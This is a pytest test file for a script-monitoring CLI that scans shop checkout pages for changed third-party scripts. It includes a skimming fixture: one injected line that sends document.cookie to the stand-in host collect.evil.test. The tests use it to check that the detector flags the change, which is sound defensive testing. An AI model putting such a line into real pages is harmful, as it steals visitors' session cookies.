from __future__ import annotations

import json

import pytest
from typer.testing import CliRunner

from script_sentinel.cli import app
from tests.conftest import FixtureSite

runner = CliRunner()

WIDGET = b"(function(){window.q=[];q.push('load');})();"
SKIM = WIDGET.replace(
    b"q.push('load');",
    b"q.push('load');navigator.sendBeacon('https://collect.evil.test/c',document.cookie);",
)


def _invoke(*args: str, env: dict[str, str] | None = None) -> tuple[int, str]:
    result = runner.invoke(app, list(args), env=env)
    return result.exit_code, result.output


@pytest.fixture
def shop(sqlite_url: str, fixture_site: FixtureSite, cdn: FixtureSite) -> tuple[list[str], str]:
    """A shop scanned once (the baseline): (--url args, vendor script URL)."""
    url = ["--url", sqlite_url]
    vendor = cdn.url("/sdk/widget.js")
    cdn.set("/sdk/widget.js", WIDGET, content_type="text/javascript")
    fixture_site.page("/checkout", f'<script src="{vendor}"></script><script>pay();</script>')
    _invoke("sites", "add", "shop", "-o", fixture_site.origin, *url)
    _invoke("pages", "add", "shop", fixture_site.url("/checkout"), "--payment", *url)
    assert _invoke("scan", "run", "shop", "--fail-on", "info", *url)[0] == 0
    return url, vendor


def test_scan_run_reports_findings_and_gates_on_severity(
    shop: tuple[list[str], str], cdn: FixtureSite
) -> None:
    url, vendor = shop
    cdn.set("/sdk/widget.js", SKIM, content_type="text/javascript")
    result = runner.invoke(
        app, ["scan", "run", "shop", "--fail-on", "HIGH", "--fail-on-unauthorized", *url]
    )
    assert result.exit_code == 5  # wins over the unauthorized gate (4)
    lines = result.stdout.splitlines()
    assert f"      ~ {vendor}  (classic, pending)  " in "\n".join(lines)
    start = lines.index("findings: 1 (review with: sentinel findings show ID)")
    assert lines[start + 1].startswith("  CRITICAL ")
    assert lines[start + 1].endswith(f"Script changed: {vendor}")
    assert lines[start + 2] == (
        "           the code changed; references new hosts: collect.evil.test; "
        "runs on a payment page"
    )
    # No new finding on the next scan: the gate passes, the unauthorized one still fails.
    assert runner.invoke(app, ["scan", "run", "shop", "--fail-on", "low", *url]).exit_code == 0
    out = _invoke("scan", "run", "shop", "--json", *url)[1]
    assert json.loads(out)["findings"] == []


def test_scan_json_and_show_include_findings(shop: tuple[list[str], str], cdn: FixtureSite) -> None:
    url, vendor = shop
    cdn.set("/sdk/widget.js", SKIM, content_type="text/javascript")
    scan = json.loads(_invoke("scan", "run", "shop", "--json", *url)[1])
    [finding] = scan["findings"]
    assert (finding["kind"], finding["severity"], finding["locator"]) == (
        "script.changed",
        "critical",
        vendor,
    )
    assert finding["reasons"][1] == "references new hosts: collect.evil.test"
    assert "detail" not in finding
    code, out = _invoke("scan", "show", scan["id"], *url)
    assert code == 0
    assert f"      ~ {vendor}" in out
    assert f"CRITICAL {finding['id']}  Script changed: {vendor}" in out
    shown = json.loads(_invoke("scan", "show", scan["id"], "--json", *url)[1])
    assert shown["findings"] == scan["findings"]


def test_findings_commands(shop: tuple[list[str], str], cdn: FixtureSite) -> None:
    url, vendor = shop
    assert _invoke("findings", "list", "shop", *url) == (0, "no findings for shop\n")
    cdn.set("/sdk/widget.js", SKIM, content_type="text/javascript")
    scan = json.loads(_invoke("scan", "run", "shop", "--json", *url)[1])
    finding_id = scan["findings"][0]["id"]

    code, out = _invoke("findings", "list", "shop", *url)
    assert code == 0
    rows = out.splitlines()
    assert rows[0].endswith(f"open         {finding_id}")
    assert rows[1].endswith(f"Script changed: {vendor}")
    listed = json.loads(_invoke("findings", "list", "shop", "--json", "--script", vendor, *url)[1])
    assert [f["id"] for f in listed] == [finding_id]
    assert _invoke("findings", "list", "shop", "--min-severity", "critical", "--json", *url)[1]
    assert _invoke("findings", "list", "shop", "--status", "resolved", *url)[1] == (
        "no findings for shop\n"
    )

    code, out = _invoke("findings", "show", finding_id, *url)
    assert code == 0
    lines = out.splitlines()
    assert lines[0] == f"finding {finding_id} (shop): script.changed, open"
    assert lines[3].startswith("  pages [payment]: ")
    assert "  new hosts: collect.evil.test" in lines
    assert "  new URLs: https://collect.evil.test/c" in lines
    assert "@@ line 1 -> line 1 @@" in lines
    assert any(line.startswith("+ navigator . sendBeacon (") for line in lines)
    detail = json.loads(_invoke("findings", "show", finding_id, "--json", *url)[1])
    assert detail["site"] == "shop"
    assert detail["detail"]["hosts_added"] == ["collect.evil.test"]

    env = {"SENTINEL_ACTOR": "alice"}
    assert _invoke("findings", "ack", finding_id, *url, env=env) == (
        0,
        f"finding {finding_id} is now acknowledged\n",
    )
    code, out = _invoke("findings", "resolve", finding_id, *url, env=env)
    assert (code, out) == (2, "error: resolving a finding needs a note saying what was done\n")
    code, out = _invoke(
        "findings", "resolve", finding_id, "-n", "Vendor notified; tag removed.", *url, env=env
    )
    assert code == 0
    code, out = _invoke("findings", "show", finding_id, *url)
    assert "  resolved by alice: Vendor notified; tag removed." in out.splitlines()
    assert _invoke("findings", "reopen", finding_id, "--actor", "bob", *url)[0] == 0
    events = json.loads(_invoke("audit", "list", "shop", "--json", "--limit", "3", *url)[1])
    assert [(e["action"], e["actor"]) for e in events] == [
        ("finding.reopened", "bob"),
        ("finding.resolved", "alice"),
        ("finding.acknowledged", "alice"),
    ]
    assert _invoke("findings", "show", "nope", *url) == (
        2,
        "error: 'nope' is not a finding id\n",
    )
    assert _invoke("findings", "ack", "00000000-0000-0000-0000-000000000000", *url)[0] == 1


def test_findings_show_for_added_scripts_and_hunk_limits(
    shop: tuple[list[str], str], cdn: FixtureSite, fixture_site: FixtureSite
) -> None:
    url, vendor = shop
    many = WIDGET.replace(b"'load'", b"'a'").replace(b"window.q", b"window.r")
    cdn.set("/sdk/widget.js", many, content_type="text/javascript")
    fixture_site.page(
        "/checkout",
        f'<script src="{vendor}"></script><script>pay();</script>'
        '<script>beacon("https://x.test/");</script><script>plain();</script>',
    )
    scan = json.loads(_invoke("scan", "run", "shop", "--json", *url)[1])
    by_kind = {f["kind"]: f["id"] for f in scan["findings"]}
    added = {f["locator"]: f["id"] for f in scan["findings"] if f["kind"] == "script.added"}
    beacon = added[fixture_site.url("/checkout#inline-2")]
    out = _invoke("findings", "show", beacon, *url)[1]
    assert "  hosts referenced: x.test" in out.splitlines()
    out = _invoke("findings", "show", added[fixture_site.url("/checkout#inline-3")], *url)[1]
    assert "hosts referenced" not in out
    _, out = _invoke("findings", "show", by_kind["script.changed"], "--max-hunks", "1", *url)
    assert out.splitlines()[-1] == "… 1 more hunk(s)"


def test_scripts_diff(shop: tuple[list[str], str], cdn: FixtureSite) -> None:
    url, vendor = shop
    code, out = _invoke("scripts", "diff", "shop", vendor, *url)
    assert (code, out) == (2, f"error: script {vendor!r} has only one version\n")
    cdn.set("/sdk/widget.js", b"/*! v2 */ " + WIDGET, content_type="text/javascript")
    _invoke("scan", "run", "shop", *url)
    code, out = _invoke("scripts", "diff", "shop", vendor, *url)
    assert code == 0
    assert "  same code: only comments or whitespace differ" in out.splitlines()
    cdn.set("/sdk/widget.js", SKIM, content_type="text/javascript")
    _invoke("scan", "run", "shop", *url)
    code, out = _invoke("scripts", "diff", "shop", vendor, *url)
    lines = out.splitlines()
    assert lines[0] == vendor
    assert lines[1].startswith("  from sha384-")
    assert lines[3].startswith("  size: ")
    assert lines[4].startswith("  tokens: -0 +")
    assert "  new hosts: collect.evil.test" in lines
    data = json.loads(_invoke("scripts", "diff", "shop", vendor, "--json", *url)[1])
    assert data["hosts_added"] == ["collect.evil.test"]
    first = data["from"]["sha384"]
    code, out = _invoke(
        "scripts",
        "diff",
        "shop",
        vendor,
        "--from",
        data["to"]["id"],
        "--to",
        first[:9],
        "--json",
        *url,
    )
    back = json.loads(out)
    assert back["hosts_removed"] == ["collect.evil.test"]
    assert _invoke("scripts", "diff", "shop", vendor, "--from", "q", *url)[0] == 2
    assert _invoke("scripts", "diff", "shop", "https://nope.test/x.js", *url)[0] == 1
